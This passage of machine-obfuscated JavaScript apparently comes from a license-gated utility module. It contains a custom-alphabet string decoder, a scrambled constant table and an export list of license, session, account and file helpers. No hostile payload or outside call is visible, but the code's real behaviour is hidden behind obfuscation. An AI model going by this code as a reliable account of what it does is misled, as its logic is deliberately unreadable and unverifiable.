          __p_9111413863_stack[__p_9111413863_stack[0x8] + 0x5f] +
            __p_2786467427_dLR_0__JS_PREDICT__(0x85)
        ]
      )),
      (__p_9111413863_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)] = JSON[
        __p_0595027781__JS_PREDICT__[__p_2786467427_dLR_0__JS_PREDICT__(0x1d)](
          void 0x0,
          0xe2
        )
      ](__p_9111413863_stack.etFpTw))
    );
    return __p_9111413863_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x15)] >
      __p_9111413863_stack[0x8] + 0x7a
      ? __p_9111413863_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x86)]
      : __p_9111413863_stack[0x4];
  }, 0x1);
export {
  getOrdinalSuffix,
  convertTimestamp,
  getCurrentTime,
  formatNumber,
  validateLicense,
  getLicense,
  createSessionDirectory,
  getSessionDirectory,
  getAllFilesFromFolder,
  writeToFile,
  readJsonFile,
  deleteFile,
  updateBanner,
  groupAccounts,
  getUserFromUrl,
  formatDate,
  countdownLicense,
};
__p_6510065121(__p_5608201760__JS_PREDICT____JS_CRITICAL__, 0x1);
function __p_5608201760__JS_PREDICT____JS_CRITICAL__(...__p_2017585016_stack) {
  var i;
  __p_2360982505(
    (__p_2017585016_stack.length = __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
    (__p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x87)] =
      __p_2017585016_stack[0x1]),
    (__p_2017585016_stack.HS2Bjt =
      'TAFfaEjct0RboVS+M?H{=73krZJ9u)IB*nPYv5&XQih/UlepLWOdsKCqgDmNG]:^@6(%8$_`zwx1>}y2<,4|#[!.;~"'),
    (__p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x88)] =
      "" +
      (__p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] || "")),
    (__p_2017585016_stack.kaVj5cF = __p_2017585016_stack.AOJwhXW.length),
    (__p_2017585016_stack.G0pvQzx = __p_2786467427_dLR_0__JS_PREDICT__(-0x15)),
    (__p_2017585016_stack.jj7K4B = []),
    (__p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x22)] = 0x0),
    (__p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x29)] =
      __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
    (__p_2017585016_stack.bKjqUd = -__p_2786467427_dLR_0__JS_PREDICT__(-0x28))
  );
  for (
    i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e);
    i < __p_2017585016_stack.kaVj5cF;
    i++
  ) {
    __p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x89)] =
      __p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x87)].indexOf(
        __p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x88)][i]
      );
    if (
      __p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x89)] ===
      -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)
    ) {
      continue;
    }
    if (
      __p_2017585016_stack.bKjqUd < __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
    ) {
      __p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x8a)] =
        __p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x89)];
    } else {
      __p_2360982505(
        (__p_2017585016_stack.bKjqUd +=
          __p_2017585016_stack.mDoKuG9 *
          __p_2786467427_dLR_0__JS_PREDICT__(-0x1d)),
        (__p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x22)] |=
          __p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x8a)] <<
          __p_2017585016_stack[0x6]),
        (__p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x29)] +=
          (__p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x8a)] &
            0x1fff) >
          __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
            ? 0xd
            : 0xe)
      );
      do {
        __p_2360982505(
          __p_2017585016_stack.jj7K4B.push(
            __p_2017585016_stack[0x5] &
              __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)
          ),
          (__p_2017585016_stack[0x5] >>= 0x8),
          (__p_2017585016_stack[
            __p_2786467427_dLR_0__JS_PREDICT__(0x29)
          ] -= 0x8)
        );
      } while (
        __p_2017585016_stack[0x6] > __p_2786467427_dLR_0__JS_PREDICT__(0x2)
      );
      __p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x8a)] =
        -__p_2786467427_dLR_0__JS_PREDICT__(-0x28);
    }
  }
  if (
    __p_2017585016_stack.bKjqUd >
    -(__p_2017585016_stack.G0pvQzx - __p_2786467427_dLR_0__JS_PREDICT__(0x2))
  ) {
    __p_2017585016_stack.jj7K4B.push(
      (__p_2017585016_stack[0x5] |
        (__p_2017585016_stack.bKjqUd <<
          __p_2017585016_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x29)])) &
        0xff
    );
  }
  return __p_2017585016_stack.G0pvQzx > __p_2786467427_dLR_0__JS_PREDICT__(0x5a)
    ? __p_2017585016_stack[0xd8]
    : __p_1990998267__JS_PREDICT__(__p_2017585016_stack.jj7K4B);
}
function __p_5137681627() {
  return [
    "zzEJQ<iLg",
    "x[_FFZz",
    "u+GBy4:*",
    "aas}B`T",
    "length",
    0x0,
    "CdDhcWj",
    0x3f,
    "fromCodePoint",
    0xc,
    "push",
    0x1,
    "undefined",
    "zZdK2b",
    0x4,
    0x3,
    0xdd,
    0x5,
    0x80,
    0x2,
    "juJuCqf",
    void 0x0,
    0x5b,
    0xff,
    0xc0,
    "dtJh5t",
    0x33,
    0x4d,
    0x9e,
    0x58,
    0x8,
    0xfa,
    "aqYkkP",
    "hWK72c",
    0x4c,
    0x48,
    0x64,
    "C_2hfmW",
    "CQ4Occi",
    "TXBzgl",
    0xd,
    0x20,
    "AJlY3n",
    "YGbZHU",
    "BLbmLeA",
    "NRCI8V",
    "emNe8lR",
    "KojjKT",
    "WKuYm3",
    0x57,
    0x35,
    0x53,
    0x55,
    0x7,
    0x25,
    "yCZCWDm",
    0x71,
    "WamTfX",
    0x9,
    "NSyO4S1",
    0x3e8,
    0x10,
    0x12,
    0x11,
    0x1fff,
    0xe,
    0xf,
    "A7Mb1v",
    "y_y4BjJ",
    0x73,
    "kTlKYU",
    0x17,
    0x13,
    0x16,
    "0",
    "apply",
    0x1a,
    "vbeBZpF",
    0x43,
    0x44,
    "call",
    0x27,
    "]",
    "O",
    "E3T_4Rq",
    0x2d,
    "Jx6Mnxd",
    0x1c,
    0xba,
    "Kd_2xlf",
    0x23,
    "WM0Omkq",
    0x6,
    "U1OywM",
    0x22,
    "p0Y4yC",
    0x36,
    "W519Mn",
    "UcJcRb",
    "Iy_ncqa",
    0x3c,
    0x18,
    0x75,
    0x93,
    0x76,
    0x41,
    0x40,
    0x3d,
    0xc6,
    0x30,
    "udeRvF",
    "Ijhb7Ss",
    0x69,
    0x63,
    0xa8,
    "UpDGEdS",
    0x45,
    0x46,
    0x19,
    0x49,
    0x56,
    0x39,
    "z_7em_c",
    0x118,
    null,
    "KEdrmG",
    0x60,
    0x61,
    "pbQKmN",
    0x31,
    "tlE1Bv",
    "ZRXKKd0",
    "AHesdTI",
    "X9Sh4S",
    "ry2Zsev",
    0x65,
    0x5a,
    "uwanXT",
    0x5c,
    0x6d,
    0x78,
    0x7f,
    0x24,
    "OMPw2JT",
    "gjSfRjA",
    "Cs6NT34",
    0x85,
    0x50,
    "hlu8j5",
    "Ra_05m",
    "d69hDM",
    0x7d,
    0xd0,
    "y7zTj5",
    0x32,
    "XoVJ6V",
    "MmpDvg",
    "BhJ1Leq",
    0x9c,
    0x4f,
    "J5ewvd",
    "g9W8aS",
    0x42,
    "t7yvGb7",
    "h5Sj6C",
    "nbznSzb",
    "pvs1aN",
    0x88,
    "JNI74Q8",
    0x4b,
    "HFZ9fR",
    "ZpRB6T",
    0x15,
    0xad,
    "|",
    0xb0,
    0xb1,
    0xbc,
    !0x0,
    0xd4,
    0x83,
    "RXzjQ2",
    "xcdq4G",
    0xdf,
    0x59,
    0x1e,
    "HS2Bjt",
    "AOJwhXW",
    "mDoKuG9",
    "bKjqUd",
  ];
}
function __p_0896022738(arrowFn, functionLength = 0x0) {
  var functionObject = function () {
    return arrowFn(...arguments);
  };
  return __p_9507432652(functionObject, "length", {
    value: functionLength,
    configurable: true,
  });
}
